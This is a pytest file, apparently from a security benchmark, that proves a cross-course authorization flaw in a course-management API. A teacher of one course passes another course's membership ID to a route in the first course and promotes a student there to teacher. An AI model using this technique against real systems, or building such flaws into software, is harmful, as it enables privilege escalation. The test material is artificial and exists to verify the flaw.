import requests
from helpers import get_user_id, get_membership_id, get_row


def test_exploit_teacher_in_one_course_can_modify_membership_in_another_course(app_instance):
    base_url = app_instance["base_url"]
    db_path = app_instance["db_path"]

    s = requests.Session()
    s.headers.update({"Accept": "application/json"})

    # login as default admin
    r = s.post(
        f"{base_url}/api/auth/login",
        json={"username": "admin", "password": "admin123"},
        timeout=5,
    )
    assert r.status_code == 200, r.text

    # register teacher_a
    r = s.post(
        f"{base_url}/api/auth/register",
        json={"username": "teacher_a", "password": "pass123", "display_name": "Teacher A"},
        timeout=5,
    )
    assert r.status_code in (200, 201), r.text

    # (optional) ensure admin session still active; re-login for determinism
    r = s.post(f"{base_url}/api/auth/logout", timeout=5)
    assert r.status_code in (200, 204), r.text
    r = s.post(
        f"{base_url}/api/auth/login",
        json={"username": "admin", "password": "admin123"},
        timeout=5,
    )
    assert r.status_code == 200, r.text

    # create two courses as admin
    r = s.post(f"{base_url}/api/courses", json={"title": "Course A", "description": "A"}, timeout=5)
    assert r.status_code in (200, 201), r.text
    course_a = r.json()["course_id"]

    r = s.post(f"{base_url}/api/courses", json={"title": "Course B", "description": "B"}, timeout=5)
    assert r.status_code in (200, 201), r.text
    course_b = r.json()["course_id"]

    # add teacher_a as teacher in course A (admin action)
    teacher_id = get_user_id(db_path, "teacher_a")
    assert teacher_id is not None
    r = s.post(
        f"{base_url}/api/courses/{course_a}/members",
        json={"user_id": teacher_id, "role_in_course": "teacher"},
        timeout=5,
    )
    assert r.status_code == 200, r.text

    # register student_b
    r = s.post(
        f"{base_url}/api/auth/register",
        json={"username": "student_b", "password": "pass123", "display_name": "Student B"},
        timeout=5,
    )
    assert r.status_code in (200, 201), r.text

    # re-login admin to ensure membership add permissions
    r = s.post(f"{base_url}/api/auth/logout", timeout=5)
    assert r.status_code in (200, 204), r.text
    r = s.post(
        f"{base_url}/api/auth/login",
        json={"username": "admin", "password": "admin123"},
        timeout=5,
    )
    assert r.status_code == 200, r.text

    # add student_b as student in course B (admin action)
    student_id = get_user_id(db_path, "student_b")
    assert student_id is not None
    r = s.post(
        f"{base_url}/api/courses/{course_b}/members",
        json={"user_id": student_id, "role_in_course": "student"},
        timeout=5,
    )
    assert r.status_code == 200, r.text

    membership_b = get_membership_id(db_path, course_b, student_id)
    assert membership_b is not None

    # login as teacher_a (attacker) and abuse course A route with membership_id from course B
    r = s.post(f"{base_url}/api/auth/logout", timeout=5)
    assert r.status_code in (200, 204), r.text
    r = s.post(
        f"{base_url}/api/auth/login",
        json={"username": "teacher_a", "password": "pass123"},
        timeout=5,
    )
    assert r.status_code == 200, r.text

    r = s.put(
        f"{base_url}/api/courses/{course_a}/members/{membership_b}",
        json={"role_in_course": "teacher"},
        timeout=5,
    )
    assert r.status_code == 200, r.text

    changed = get_row(
        db_path,
        "SELECT role_in_course, course_id FROM memberships WHERE membership_id=?",
        (membership_b,),
    )
    assert changed["course_id"] == course_b
    assert changed["role_in_course"] == "teacher"